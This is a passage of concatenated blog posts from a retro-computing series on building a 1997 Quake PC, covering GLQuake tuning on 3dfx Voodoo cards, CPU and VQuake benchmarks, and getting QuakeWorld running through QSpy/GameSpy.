loud \"click\" sound when the 3Dfx card takes over or releases the signal!</p> <p>I suspect these mechanical parts are components begging to fail. I seriously expected this card to die any day I used it.</p> <p>All flavors of Quake use a different image format for their screenshot. While quake.exe uses PCX, vquake.exe generates BMP, and glquale.exe uses TGA!</p> <p>First impression</p> <p>I installed the latest 3DFX Voodoo Orchid Righteous drivers v3.00.00 (satisfying it is to make sense of the drivers files now that I understand VxDs). As I launched <code>glquake.exe</code>, the game did not start right away. First it generated a palette translation file (<code>15to8.pal</code>).</p> <p></p> <p>Then it \"meshed\" all the alias models. It is a step that converts all mdl files to a structure made of <code>GL_TRIANGLE_FAN</code>/<code>GL_TRIANGLE_STRIP</code> and cache them into ms2 files.</p> <p></p> <p>My first impression of GLQuake was terrible. The feeling came from a combination of small annoyances and bigger problems. In the small things, I thought the menu was kind of blurry compared to VQuake.</p> <p></p> <p>glquake      vquake</p> <p>There is also no way to change the resolution at runtime. It was quite annoying to see a screen telling you to do it via command-line given that all other versions of Quake (quake.exe, winquake.exe, and vquake.exe) are capable of it.</p> <p></p> <p>If a user messes up the parameters into an incompatible configuration, they are welcomed with a crude error message which lacks polish. Moreover, most of the modes listed are not supported, which means it is trial and error to discover what works and what doesn't.</p> <p></p> <p>In the end, it turned out that only 640x480 and 512x384 worked in my configuration. Sadly no 400x300 which I thought was the sweet spot when enjoying vquake.exe.</p> <p>It gets worse!</p> <p>The impression got worse when I started a new game. While the explosions looked really good, the colors looked washed out.</p> <p></p> <p>Doing some research, it turned out I was not the only one being thrown off. Only people used more colorful terms back in the days.</p> <p>Glquake looks like shit. I know a few of you may argue here, but really, lets face it - it looks terrible, especially on NVidia cards.  </p> <p>- @Frib, Unofficial Glquake &amp; QW Guide[2]</p> <p>There is a cool list of the difference between quake.exe and glquake.exe on quakeaddicted(texture filtering, over-bright, fullbrights, Non-square pixels, and Affine texture mapping on alias models).</p> <p>There is also a partial explanation of why the colors are different.</p> <p>The original quake (software) engine used overbright lighting, which means the lightmap brightness can go up to 200%. So, light.exe creates BSP files with lightmaps that go up to 200%.  </p> <p>In glquake [\u2026] there is no overbright lighting, so every part of the lightmap that goes above 100% is flattened to equal 100%. This is why glquake looks just fine in darker rooms, but in bright areas the lighting looks very flat.  </p> <p>- quakeaddicted[3]</p> <p>Second impression</p> <p>The thing I had to understand is that GLQuake does not work like VQuake. VQuake was tailored made for one chip, the v1000. It is designed to work \"out of the box\" with next to no parameters to tweak. GLQuake on the other hand had to cater for anything via OpenGL standard. It is up to the user to tune it down for their particular card. GLQuake is a la carte.</p> <p>And GLQuake has many items on the menu. Some are 3DFX specific environment variables while some are in-game engine cvars. John Bye (aka Gestalt666) put together a fantastic site[4][5] to summarize them all and even provided a glquake.bat and a glquake.cfg (to be placed in the id1 folder).</p> <p>The environment variables range from quality of life like <code>FX_GLIDE_NO_SPLASH</code> to skip the 3dfx splash screen to deep change such as overlocking from 50MHz to 56MHz (<code>SST_GRXCLK=56</code>). The biggest improvement for me is that it fixed the colors <code>SST_GAMMA=1.2</code>.</p> <pre><code>SET SST_SCREENREFRESH=72\nSET SST_SWAP_EN_WAIT_ON_VSYNC=0\nSET SST_VIDEO_24BPP=1\nSET SST_GAMMA=1.2\nSET FX_GLIDE_NO_SPLASH=1\nSET FX_GLIDE_SWAPINTERVAL=0\nSET SST_FASTMEM=1\nSET SST_FASTPCIRD=1\nSET SST_GRXCLK=56\n</code></pre> <p>I am not sure I would recommend overclocking to 56MHz. The card ran hot HOT HOT!</p> <p></p> <p>Stock      Gamma 1.2</p> <p>The colors can also be fixed with a program like IdGamma[6] to overload the palette.</p> <p>While the environment variable controls the 3dfx chip, the Quake cvar configures the engine. One of my favorite options was to disable bilinear filtering and get to see these cute pixels.</p> <p></p> <p>GL_LINEAR      GL_NEAREST</p> <p>Bilinear texture filtering costs nothing on a 3dfx thanks to the four-way interleaved VRAM storing the textures. GL_LINEAR/GL_NEAREST does not affect the framerate contrary to v1000 cards.</p> <p>There are many cvar that provide a trade-off between performance and visual improvement. A quite impressive one for 1997 is that Quake is able to draw real projected shadows. It looks however that it was an experimental feature (disabled by default) since I saw quite a bit of peter-panning.</p> <p></p> <p>Another cool trade-off is flash configuration. GLQuake can either regenerate surfaces to be lit according to dynamic light source (slow and involves the CPU). Alternatively, it can throw the 3fdx and its fillrate at it by blending a blast sphere. The latter is enabled by default and looks quite good.</p> <p></p> <p>gl_flashblend 0      gl_flashblend 1</p> <p>It seems there was support for alpha transparency of water but I found it quite buggy. Also Quake maps had to be re-processed to have the PVS include surfaces that would otherwise be opaque in the software renderer.</p> <p>This was supposed to be water.</p> <p>GLQuake had to find a way to replicate \"palette shift\" where the whole screen briefly fades to yellow when picking up an item or red when taking damage. That is something that consumes a lot of fillrate in glquake because it is done by blending a quad over the whole screen. This was identified as a performance hit and could be disabled.</p> <p></p> <p>In this ocean of features and parameters, I settled for little visual embellishment close to the software renderer in favor of high framerate.</p> <pre><code>r_drawviewmodel 1        // Enable/Disable drawing the weapon held by the player.\nr_mirroralpha 0          // Turn some surfaces into mirrors. See readme.glquake.\n[r_shadows](https://quakewiki.org/wiki/r_shadows) 0              // Make alias models cast a shadow. Pretty cool.\nr_wateralpha 1           // Buggy. Alpha blend water but poor map support. 1 mandatory.\ngl_texturemode GL_LINEAR // Blurry or pixelated textures.\n[gl_flashblend](https://quakewiki.org/wiki/Gl_flashblend) 1          // Blend to simulate explosions instead of regenerating surfaces.\n[gl_polyblend](https://quakewiki.org/wiki/gl_polyblend) 1           // Simulate palette shift with a GL_QUAD over the screen.\n[gl_ztrick](https://quakewiki.org/wiki/Gl_ztrick) 1              // Trick to avoid clearing the depth buffer\n[gl_keeptjunctions](https://quakewiki.org/wiki/Gl_keeptjunctions) 0      // Remove collinear vertices when it reloads the level.\ngl_subdivide_size 256    // Sets the division value for the sky brushes.\n</code></pre> <p>GLQuake rules</p> <p>With all the tuning done, I changed my mind about GLQuake. It was insanely cool and the framerate was a dream at 640x480. I loved it. It was time to run some benchmarks.</p> <p>Benchmarking</p> <p>The Orchid Righteous 3dfx only really supports 640x480. The resolution 512x384 did work but displayed weird and unpleasant vertical \"bands\".</p> <p>| MMX 233 MHz | MMX 200 MHz | MMX 166 MHz | MMX 133 MHz ---|---|---|---|--- quake.exe | 27.8 | 27.0  | 27.2 | 26.9 gl_quake.bat | 33.8 | 33.4 | 33.6 | 29.4 Pretty impressive how little impact the CPU frequency has on the framerate when rendering via the 3dfx. It would mean the framerate is dominated by rasterization and pushing the pixels to the video card which in the case of glquake is not done by the CPU. But since all the projection and clipping is done on the CPU in the glide driver, this could mean that Gary's team may have had aces in their sleeve that id did not. After all, they knew about the InvSqrt that surfaced in Quake III (1999) since 1995[7]. I think it is fairly safe to say the InvSqrt[8] trick helped to run the 3dfx 1. To take things to an extreme level, one could download GLQPlus which reportedly push cards to deliver 5 - 10+ fps[9]. I did not want to push grandpa too hard so I did not try it. K5</p> <p>Like for the v1000, I wanted to see how much a 3dfx 1 could enable a K5/6x86 to play Quake. I ran a basic test with an AMD K5 PR166. The machine did reach a playable framerate with 26.3fps at 640x480[10]. Going Voodoo2</p> <p>It does not make much sense to use a 3Dfx Voodoo2 in a Pentium 1 build. But this is a card I ava adore, and we must never be apart. The Voodoo2 embodies excellence[11]. I even find the PCB beautiful. Back in the day this card dominated consumer 3D and nothing came close to challenge its performance. I never owned one until now. So I decided to use it anyway despite the anachronism (the Voodoo2 was released in Feb 1998, after Quake II came out). Most of the environment variables changed (see them all on mdgx.com) so I crafted two launch scripts, 3dfx2_640_480.bat and 3dfx2_800_600.bat. The glquake.cfg script remained the same.  The Creative Voodoo2 does not have a mechanical relay. Switching to 3D rendering is reassuringly silent. Benchmark running at 640x480. |  | MMX 233 MHz | MMX 200 MHz | MMX 166 MHz | MMX 133 MHz ---|---|---|---|--- quake.exe |  58.5 |  57.2 |  55.1 |  51.9 gl_quake.bat | 78.3 | 72.9 | 64.8 | 57.8 Benchmark running at 800x600. |  | MMX 233 MHz | MMX 200 MHz | MMX 166 MHz | MMX 133 MHz ---|---|---|---|--- quake.exe | 46.9 | 46.5 | 45.9 | 44.8 gl_quake.bat | 46.8 | 60.1 | 57.7 | 54.2 The numbers speak for themselves. More benchmarks are available on Voodoo2 Support Guide and FAQ. Next</p> <p>Epilogue.References</p> ^ [ 1] Johm Carmack .plan, FEB 12, 1998 ^ [ 2] Unofficial Glquake &amp; QW Guide ^ [ 3] Differences between software rendered Quake and GLQuake ^ [ 4] GLQuake FAQs ^ [ 5] GLQuake Troubleshooting FAQs ^ [ 6] idGamma and tools webpage ^ [ 7] Origin of Quake3's Fast InvSqrt() ^ [ 8] Fast inverse square root ^ [ 9] Comparison of Frame-rates in GLQuake Using Voodoo &amp; Voodoo 2 3D Cards ^ [10] Project: High-End Win95 Computer without MMX! ^ [11] The story of the 3dfx Voodoo1 <p>*</p>"},{"location":"fabiensanglard.net/Building%20a%201997%20Quake%20PC-%20Benchmarking%20Quake_20260205/","title":"Building a 1997 Quake PC: Benchmarking Quake","text":"<p>\u6765\u6e90: https://fabiensanglard.net \u94fe\u63a5: https://fabiensanglard.net/quake_pc/quake/index.html \u65e5\u671f: 12 Jan 2026 00:00:00 +0000</p> <p>FABIEN SANGLARD'S WEBSITE </p> <p>CONTACT RSS DONATE</p> <p>Jan 12, 2026  </p> <p>This article is part of the Quake PC series.</p> <p>Building a Quake PC: Benchmarking Quake</p> <p>Getting into the benchmark of the software rendered versions of Quake, there were so many questions I wanted to answer.</p> <p>Is <code>quake.exe</code> as fast under Windows 95 as under DOS? What about <code>winquake.exe</code> under Windows? What is the impact of the video card bus? How good was Intel compared to Cyrix and the AMD K5? Did the K6 do better than K5? What about RAM, is SDRAM really making a difference compared to EDO? Does AGP really provide an improvement over PCI?</p> <p>Test conditions</p> <p>Unless specified otherwise, all the benchmarks were run under gameplay conditions. That is, from DOS, with sound on, music playing from the CD, and view size set to 101 (example). The graphic card was always a Matrox Mystique or Matrox Millenium. The motherboard for all Socket 7 CPUs was a XA100[1]. I used the <code>demo1</code> demo for all my benchmarks.</p> <p>Running the command <code>timedemo demo1</code> will fail in Quake v1.01. The command was only introduced starting in v1.06.</p> <p>Part of the CPU roaster. The K5 is missing and the ugly one on the right is aP200.</p> <p>Intel benchmark</p> <p></p> <p>Intel CPUs start to provide an enjoyable experience around 90MHz (at least for my taste) with the Pentium 120Mhz being the sweet spot, clocking at roughly 30 fps.</p> <p>Checking out June '96 magazine also indicates that Pentium 120MHz were the standard new machine at the time[2] so id's timing was not too bad.</p> <p>Even a Pentium 75MHz was able to provide 20 fps which, by 1996 standard, was \"smooth\". A bit of usenet archeology reveals that customer's expectations were quite different from now.</p> <p>I have a p133, 16mb ram, 4mb millenium, and I run quake at 512x384, and get 17fps... works and looks great.  </p> <p>- Matthew Lowth (rec.games.computer.quake.playing 1996)[3]</p> <p>What a time the late '90s were. In these magazines, one could frequently find ads \"The demand for computer programmers will double by the year 2005. Train now for a high-career as a computer programmer!\"[4].</p> <p>Intel MMX benchmark</p> <p>A Pentium MMX runs QUAKE faster but not because of MMX instructions (QUAKE doesn't use them). With its ability to process up to four times the data via SIMD an MMX CPU is more subject to instructions starvation. Moreover, the pipeline had been extended from five to six stages in order to decode MMX instructions. To fix these two problems, an MMX Pentium features the following improvements.</p> <ul> <li>Double dCache and iCache size (16KiB each) to reduce the performance lost from cache misses at high core clock speeds.</li> <li>The longer pipeline has a cost of one extra penalty cycle on a mispredicted branch. To mitigate this downside, the P55C has an enhanced branch target buffer that uses a two- level algorithm similar to the P6.</li> <li>New stage provides other benefits as well: it provides slightly more data-cache access time (another critical path in P54C), so it should improve 200-MHz yield, and it allows non-MMX instructions to be paired for dual-issue in some circumstances that the P54C did not allow. </li> </ul> <p></p> <p>As a result, an MMX CPU is able to run Quake 7% faster than a \"normal\" Intel CPU running at the same frequency.</p> <p>Cyrix 6x86 benchmark</p> <p>The story of the Cyrix 6x86 and how its abysmal performance contributed to killing the company is quite notorious. But how bad was it really? Really really bad it turned out.</p> <p></p> <p>The outcry from players at the time was significant with many taking it to usenet to manifest they disappointment. When a post features 106 exclamation marks (I counted), you know they are for real.</p> <p>WARNING: DON\u2019T BUY CYRIX.READ THIS NEWS!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\u201c </p> <p>- \u2013 comp.sys.ibm.pc.games.action (1996)[5]</p> <p>The issue was compounded by Cyrix's usage of Performance Rating (PR) to label its processors. A 6x86 P166+ ran at 133MHz but Cyrix was confident to tell consumers it was the equivalent of an Intel Pentium 166MHz. This may have been true for integer operations but not for floating-point, which Quake used a lot of. As a result, a Cyrix CPU ran quake.exe at 50% the speed of an Intel CPU.</p> <p>I have done extensive testing of the Cyrix 6x86 P150+ and the Intel P150 in the exact same system (I just swapped CPU\u2019s) and the P150+ is impressive (just a hair faster) as long as applications that use FP math are avoided. However, many newer applications and games are taking advantage of FP math, and the Cyrix REALLY SUCKS on these apps. </p> <p>- comp.sys.ibm.pc.games.action (1996)[6]</p> <p>Cyrix degraded their reputation further with their infamous \"Floating Point Performance Summary\"[7] with benchmarks using a 3D accelerator and statements showing a complete disconnect with the gamer community.</p> <p>To achieve smooth motion, the frame rate typically needs to be greater than approximately 13 frames/second. </p> <p>- Cyrix Floating Point Performance Summary(1996)[8]</p> <p>A year later, the explanation for these abysmal performances was given by John Carmack.</p> <p>The floating-point issue has really hurt AMD and Cyrix. We had AMD and Cyrix down here while we were developing Quake, and we said, \u201dLook, floating point\u2019s going to be important,\u201d but because there weren\u2019t any benchmarks or any applications they\u2019d used at that time, they brushed it under the rug.  </p> <p>AMD and Cyrix both have non-pipeline FPUs, which is their Achilles\u2019 heel. In terms of integer performance a lot of them are on par or, even in some cases, better than Intel, but we optimize for Intel because the Pentium\u2019s got the FXCH change trick to pipeline all these things. And it\u2019s pretty tweaky but it pervades all of our assembly language code for Quake. So we\u2019re de-optimized for non-Intel chips, but it was the only sensible thing to do. </p> <p>- John Carmack (1997)[9]</p> <p>If you want to learn more about Cyrix and Quake, Nostalgia Nerd made a cool video about it[10].</p> <p>AMD K5 benchmark</p> <p>The AMD K5 suffered the same kind of floating-point shortcoming as the Cyrix 6x86. AMD also used a Performance Rating (PR) system which made players feel like they had been deceived.</p> <p></p> <p>An AMD K5 runs Quake at roughly 50% the framerate of an Intel CPU.</p> <p>AMD K6 benchmark</p> <p>Contrary to Cyrix, AMD survived Quakegueddon. Less than a year later after the K5, they managed to ship the K6. The details of whether they had to improve floating-point because of the K5 fiasco or if they already had it in the pipeline is unknown but they did rectify (but not to the point of beating Intel).</p> <p></p> <p>If you want to learn more about the internals of the K6, RTL Engineering did a really good video about it[11].</p> <p>Performance DOS vs Windows 95</p> <p>The difference between <code>quake.exe</code> running under DOS and Windows is something already covered in a prior article (Why WinQuake exists and how it works).</p> <p>The performance hit is noticeable. While a Pentium MMX 233 MHz can reach 48 fps under DOS, the framerate drops to roughly 38 fps under Windows 95. That is roughly 25% slower. </p> <p>I ran into issues to enable SB emulation with the SB Live. I kept on getting this weird error.</p> <pre><code>Error: Config file is incomplete.\nSBPort\nCreative SB16 Emulation Driver NOT Loading.\n</code></pre> <p>The problem was that I transferred the drivers as a folder over FTP and it messed up the carriage return formatting of text files. As much as possible, files should be transferred as zip archive or iso.</p> <p>Performance Windows 95 vs WinQuake</p> <p>Likewise, this is something already covered in Why WinQuake exists and how it works. The port to win32 greatly reduced the performance gap. Using its fastest backend, <code>winquake.exe</code> brings up the framerate within 6% of <code>quake.exe</code> running under DOS.</p> Configuration Framerate (P233 MMX) <code>quake.exe</code> on DOS 48 <code>quake.exe</code> on Windows 9X 38 <code>winquake.exe</code> (fastvid) on Windows 9X 45 <p>AGP vs PCI</p> <p>I wanted to see if using an AGP card would make things better so I got a Matrox G200 SGRAM (798-02). This is not a really fair comparison because this is not the same graphic chip as the one in the Matrox Mystique 220 4MB (644-03) but I thought it was pretty close.</p> <p></p> <p>I could barely measure any difference. Sometimes performance would be 1fps lower, sometimes 1fps higher.</p> <p>EDO vs SDRAM</p> <p>I purchased 128 MiB of EDO DIMM to compare with SDRAM. On paper, EDO is 33% slower than SDRAM so I was curious to see the impact on Quake framerate.</p> <p></p> <p>The difference could barely be measured. With EDO, <code>winquake.exe</code> in <code>fastvid</code> mode ran at 44.6 fps. With SDRAM, I got 45 fps. That is a mere 1% difference. My hypothesis is that the L1 and L2 cache are hit so much that the difference between EDO and SDRAM is not visible.</p> <p>Pentium Pro</p> <p>It was beyond the scope of what I could benchmark on this machine but there was a section of TECHINFO.TXT about the P6 that intrigued me.</p> <pre><code>The Pentium Pro is a very fast Quake platform.\nIn 640x480 it was very playable (and looked great!).\n</code></pre> <p>To run these benchmarks, a fellow retro-enthousiast's W6-LI[12] motherboard was used with a Matrox Mystique (with fastvid.exe to fix the 440FX chipset video bug).</p> <p></p> <p>The Pentium Pro is faster than even a Pentium MMX at the same frequency. The performance is not surprising since the P6 was a complete departure from the P5, featuring out-of-order execution and a humongous on-board L2. It was so good, its architecture became the basis of the Pentium II.</p> <p>As for 640x480, it ran \"pooly\" by 2026 standard, and \"butter-smooth\" by 1996 standards[13].</p> <p></p> <p>Next</p> <p>Benchmarking VQuake.</p> <p>References</p> ^ [ 1] Non-Socket 7 benchmarks were run on fellow retro-enthusiasts machines. ^ [ 2] PC ads in June 96 ^ [ 3] How does Quake run on a P133? ^ [ 4] ^ [ 5] WARNING: DON'T BUY CYRIX. READ THIS NEWS! ^ [ 6] WARNING: DON'T BUY CYRIX. READ THIS NEWS! ^ [ 7] Cyrix Floating Point Performance Summary ^ [ 8] Cyrix Floating Point Performance Summary: Smooth framerate ^ [ 9] John Carmack - The Boot Interview ^ [10] Nostalgia Nerd: What Happened to Cyrix Processors? ^ [11] RTL Engineering: Quake, Floating Point, and the Intel Pentium ^ [12] Micronics W6-LI  ^ [13] Comparison of Frame-rates in Quake <p>*</p>"},{"location":"fabiensanglard.net/Building%20a%201997%20Quake%20PC-%20Benchmarking%20Vquake_20260205/","title":"Building a 1997 Quake PC: Benchmarking Vquake","text":"<p>\u6765\u6e90: https://fabiensanglard.net \u94fe\u63a5: https://fabiensanglard.net/quake_pc/vquake/index.html \u65e5\u671f: 13 Jan 2026 00:00:00 +0000</p> <p>FABIEN SANGLARD'S WEBSITE </p> <p>CONTACT RSS DONATE</p> <p>Jan 13, 2026  </p> <p>This article is part of the Quake PC series.</p> <p>Building a Quake PC: VQuake</p> <p>The Rendition Verite 1000 is Quake legend. It was the first hardware-accelerated card supported by an id title with a dedicated binary, <code>vquake.exe</code>. It was also the one used during the final round of 16 in the notorious Red Annihilation tournament where Thresh won[1] John Carmack's 1987 Ferrari 328 GTS Cabriolet.</p> <p>In 1997, the enthusiasm for vquake and these 3D accelerators was palpable in magazines.</p> <p>Quake is almost a completely different game with the 3D Blaster. Performance was about 50% better than standard Quake on a P166-with features such as bilinear filtering and full MIP mapping turned on at 640x480, The image quality was, to put it simply, superb.  </p> <p>- Computer Gaming World #149[2]</p> <p>Four vendors, Creative, Intergraph, Sierra, and Canopus picked up the v1000. Sierra's Screamin\u2019 3D enjoyed good reviews[3]. That is the one I managed to find on eBay. It cost its weight in diamond but I was happy to own such an iconic piece of technology.</p> <p></p> <p>The v1000 graphic pipeline is programmed via speedy 3D micro-code. To this effect, <code>vquake.exe</code> ships with a <code>SPD3D.UC</code>. Upgrading quake to the latest version of vquake directly will result in error \"SPD3D.UC file not found or not compatible\". That file was only included in vquake's first release.</p> <p>Bilinear texture filtering, aka Lerp</p> <p>Something that was deemed cool at the time was bilinear filtering. It was \"hiding\" pixels and everybody loved the effect back in the days. Thirty years later, pixels are cool again.</p> <p></p> <p>Lerp:0      Lerp:1</p> <p>Weirdly, the acronym for l inear interp olation came to be \"lerp\". I used the same term in this article.</p> <p>VQuake screenshots use BMP instead of PCX. This makes sense because the renderer is 16-bit color instead of palette indexed.</p> <p>VQuake is indeed a game changer</p> <p>As soon as Vquake started, it was obvious how much of an improvement it was over the software rendered version. The framerate is higher and the resolution as well. Despite its visual prowess the port is faithful in terms of lighting and colors. It is as dark as the original game intended.</p> <p> </p> <p>Vquake bilinear filtering has a \"signature\" look with a peculiar and easily recognizable type of dithering.</p> <p></p> <p>Lerp:0      Lerp:1</p> <p>The software renderer of Quake supports something called \"full_bright\" to allow textures to shine in the dark. This was an effect showcased in the E1M1 staircase to keep the player on their toes. glQuake would later fail to replicate that effect but Vquake does it perfectly.</p> <p></p> <p>vquake      software     glquake</p> <p>2D performance from DOS</p> <p>Before testing its hardware-accelerated feature, I took the time to benchmark the Screamin'3D with <code>quake.exe</code> software renderer. I used a Pentium MMX 233MHz under DOS with 101 view size, and sound enabled. The result was terrible with 26.2 fps. That is 50% of the framerate achieved with a Matrox Mystique (48 fps)! What a terrible VGA card!</p> <p>Performance</p> <p>How does vquake with Rendition Verite compare to quake running on a Matrox Mystique?</p> P51 MMX 233MHz 320x200 320x240 384x288 400x300 512x384 640x400 640x480 720x480 768x576 Matrox Mystique 48.0 45.5 18.5 15.7 Rendition Verite 52.8 48.9 44.0 40.6 30.6 27.1 23.6 18.1 14.0 <p>While there is not much of an improvement at low resolution, the v1000 does shine at higher resolution with even an MMX 233MHz unable to keep up.</p> <p>Under-clocking the CPU to 133MHz showed that Vquake is not very sensitive to CPU frequency. The framerate is actually very close to what the same processor running at 233MHz could produce.</p> <p>P51 MMX 133MHz | 320x200 | 320x240 | 384x288 | 400x300 | 512x384 | 640x400 | 640x480 | 720x480 | 768x576 ---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|--- Matrox Mystique | 37.9 | 33.0 |  |  |  | 15.3 | 13.1 |  |  Rendition Verite | 46.4 | 43.6 | 40.4 | 37.4 | 29.6 | 26.5 | 23.3 | 18.0 | 14.0  </p> <p>Performance: DOS vs Windows</p> <p>Next on the list, I wanted to measure perf from DOS and Windows to see if the v1000 suffered the same type of penalty as the software renderer.</p> <p>| 320x200 | 320x240 | 384x288 | 400x300 | 512x384 | 640x400 | 640x480 | 720x480 | 768x576 ---|---|---|---|---|---|---|---|---|--- DOS | 52.8 | 48.9 | 44.0 | 40.6 | 30.6 | 27.1 | 23.6 | 18.1 | 14.0 Windows | 47.6 | 44.7 | 41.6 | 38.5 | 29.9 | 26.7 | 23.4 | 18.0 | 14.0  </p> <p>Like <code>quake.exe</code>, <code>vquake.exe</code> does suffer a noticeable penalty when started from Windows 9X. This is only true at low resolution. As the resolution increases, the gap almost disappears.</p> <p>Texture filtering</p> <p>Out of all vquake's cvar[4], the most interesting one is <code>d_bilerp</code>. It allows to disable bi-linear filtering and bring back the pixels.</p> <p>| 320x200 | 320x240 | 384x288 | 400x300 | 512x384 | 640x400 | 640x480 | 720x480 | 768x576 ---|---|---|---|---|---|---|---|---|--- d_bilerp=1 | 52.8 | 48.9 | 44.0 | 40.6 | 30.6 | 27.1 | 23.6 | 18.1 | 14.0 d_bilerp=0 | 53.2 | 49.8 | 48.5 | 42.2 | 32.6 | 33.4 | 25.6 | 21.3 | 16.3  </p> <p>Not using bi-linear filtering improves the framerate noticeably at higher resolution. That's because the v1000 does not have any special bus/interleave to handle the extra need of sampling. This is very different from 3dfx cards where GL_LINEAR held the same performance as GL_NEAR.</p> <p>Even though I much prefer the crisp pixels, this is not what players used at the time. In order to gather historically relevant metrics, I ran benchmarks with bi-linear filtering enabled (d_bilerp=1).</p> <p>latest BIOS (phx2105.com)</p> <p>Rendition released a TSR, phx2105.com, which updated their chip BIOS. It looks really cool to load it in the DOS prompt.</p> <p></p> <p>The new BIOS adds two new resolutions (720x400 and 856x480) but provides next to no framerate improvement.</p> 320x200 320x240 384x288 400x300 512x384 640x400 640x480 720x400 720x480 768x576 856x480 52.8 48.9 44.0 40.6 30.6 27.1 23.6 18.1 14.0 53.1 48.8 44.0 39.4 30.6 27.1 23.5 22.0 18.1 14.0 16.0 <p>Impact of CPU frequency</p> <p>I took the \"impact of frequency\" benchmark a bit further and tested various clocks on an MMX CPU.</p> 320x200 320x240 384x288 400x300 512x384 640x400 640x480 720x400 720x480 768x576 856x480 53.1 48.8 44.0 39.4 30.6 27.1 23.5 22.0 18.1 14.0 16.0 51.4 47.9 43.4 39.1 30.5 27.1 23.5 21.9 18.1 14.0 16.0 49.3 46.1 42.5 38.5 30.2 26.9 23.4 21.9 18.1 14.1 16.0 46.4 43.6 40.4 37.4 29.6 26.5 23.3 21.8 18.0 14.0 16.0 <p>This confirmed the initial finding. The CPU speed does not affect the framerate as soon as resolution reaches 512x384.</p> <p>AMD K5</p> <p>The last thing I tested with Vquake was how much the v1000 was able to rehabilitate the K5 and Cyrix 6x86. Unfortunately, due to how the v1000 was used, a lot is still done on the CPU. This really seems to limit the ability of the Rendition Verite to fly on a K5/6x86.</p> <p>I ran the test in the same conditions, with screen size 101, sound enabled, and from DOS. The K5 ran at 30.6 fps at 320X200, 21.2fps in 512X384, and 15.4fps in 640X480. Not a good combo (as confirmed by usenet thread[5] from 1996).</p> <p>Next</p> <p>Benchmarking GLQuake.</p> <p>References</p> ^ [1] Red Annihilation ^ [2] Computer Gaming World #149 ^ [3] NEXT_Generation #26: Rendition Verite review ^ [4] List of vquake cvars ^ [5] AMD K5-133 FP performance <p>*</p>"},{"location":"fabiensanglard.net/Is%20QSpy%20still%20cool-%20Let%27s%20play%20QuakeWorld%21_20260205/","title":"Is QSpy still cool? Let's play QuakeWorld!","text":"<p>\u6765\u6e90: https://fabiensanglard.net \u94fe\u63a5: https://fabiensanglard.net/quakeworld/index.html \u65e5\u671f: 16 Jan 2026 00:00:00 +0000</p> <p>FABIEN SANGLARD'S WEBSITE </p> <p>CONTACT RSS DONATE</p> <p>Jan 16, 2026</p> <p>Is QSpy still cool? Let's play QuakeWorld!</p> <p>With the Internet being grossly expensive in France until 1999, I never got a chance to experience Quakeworld. Don't feel bad, I came back with great vengeance when it came to trading on Diablo II to become a SOJilionaire. But I digress.</p> <p>With the Quake PC finished, the game I was the most eager to finally discover was naturally QuakeWorld. Being thirty years late to the game (literally), would any of that still run on my precious 233MHz relic? Let's find out.</p> <p></p> <p>QuakeWorld 101</p> <p>QuakeWorld does not stand alone. When it starts, a splash screen indicates that further instructions are available at www.quakeworld.net. However that URL now redirects to ign.com since the two entities merged in 2004.</p> <p></p> <p>You obviously can't play Single Player.</p> <p></p> <p>And you can't select Multiplayer either. There is no integrated menu to search/select a server or join a game.</p> <p></p> <p>Thanks to the Wayback Machine we can still see what quakeworld.net used to look like. There is also a good description of how players used the service.</p> <p>QuakeWorld Master Server</p> <p>To run properly, QuakeWorld Client must be started with parameters on the command-line pointing to a QuakeWorld Server (e.g.: <code>-connect 192.168.01.</code>). To make it easy to find them, each QuakeWorld Server registers itself with QuakeWorld MasterServer when it starts. The most convenient way to play QuakeWorld is to use a tool that has a list of master servers, retrieve all the servers available, let you pick one, and start the QuakeWorld client with the proper command-line parameters.</p> <p>The MasterServer protocol is based on simple text-based messages. It was documented in 1997 by Nicholas Maher.</p> <p>QSpy is cool</p> <p>Instead of building this tool, id Software selected something that was already popular in the Quake community. The communication about how to make it happen was even published.</p> <pre><code>From: John Carmack &lt;johnc@idnewt.idsoftware.com&gt;\nTo: jep@sclsis.navy.mil\nSubject: Quake World\nDate: Wednesday, August 07, 1996 11:03 AM\n\nQspy is cool.\n\nWant to be the official front end for the QuakeWorld project?\n\nI think the initial research releases of QuakeWorld are going to be native\nwin32 apps only, and they will listen on a control socket, so an external\nwindows app can very nicely send them from server to server.\n\nIf you are interested, I can go over the new features we are considering\nthat would be pertinent, and solicit some opinions from you.\n\nJohn Carmack[1]\n</code></pre> <p>Is QSpy still cool?</p> <p>It was easy to find since QSpy came bundled with Quakeworld installer, qw1022.exe.</p> <p>QSpy was renamed GameSpy 3D.</p> <p>During the installation, I was supposed to be able to pick the colors of my skin. I was unable to make this work but I could still progress to the next step.</p> <p></p> <p>Once installed, GameSpy 3D hit the net and came back with an empty list of QuakeWorld servers. That was unsurprising. I fully expected the master server list to be obsolete thirty years later.</p> <p></p> <p>But GameSpy had the good idea to allow users to update the list. I found a few master servers on quakeservers.net. Bless your soul whoever is maintaining this.</p> <p></p> <p>I hit refresh and it looked like \"something\" was happening!</p> <p></p> <p>Within seconds I saw thousands of servers popping up (with players). I cannot describe the joy and overall awe to see this whole stack still able to run.</p> <p></p> <p>Gamespy.com closed in 2013 when it merged with ign.com. But they had the good taste of keeping the website up. It actually still renders well with IE4.</p> <p></p> <p></p> <p>I picked a game and Quakeworld started. The excitement kept on growing since it looked like it was downloading the bsp map.</p> <p></p> <p>Downloading content was one of the improvements of Quakeworld , the regular quake could only play games where all players already had the bsp in their id1 folder.</p> <p>And then the map would not actually load. The screen only mentioned something about the version. Oh my. Are they running servers for which there is no client on Windows 9X. Is it only for Quakeworld modern ports like EZQuake?</p> <p></p> <p>I noticed I was using v2.10. The server claimed to be v2.40. The latest version of Quakeworld Client available for Windows 9X was v2.34. This did not look good. I went on the amazing Quake Offical Archive[2] by Jason Brownlee and got client v2.34. And it worked! I was able to start the game and officially took my first step in QuakeWorld.</p> <p></p> <p>And the game crashed immediately. I had seen perhaps six frames and a half of it. Brief but intense.</p> <pre><code>Z_Malloc: failed on allocation of 40 bytes\n</code></pre> <p></p> <p>Failing on such a small amount made me wonder again if v2.34 client would actually work with v2.40 server. Are the packets different? I have 340MiB installed on this machine, could it be too much and something wraparound?</p> <p>A little bit of Googling revealed a treasure trove of players helping each other. It turned out the problem was the amount of RAM dedicated to small strings and structs. Adding <code>-zone 1024</code> to the QSpy launcher fixed the problem.</p> <p></p> <p>All you need it 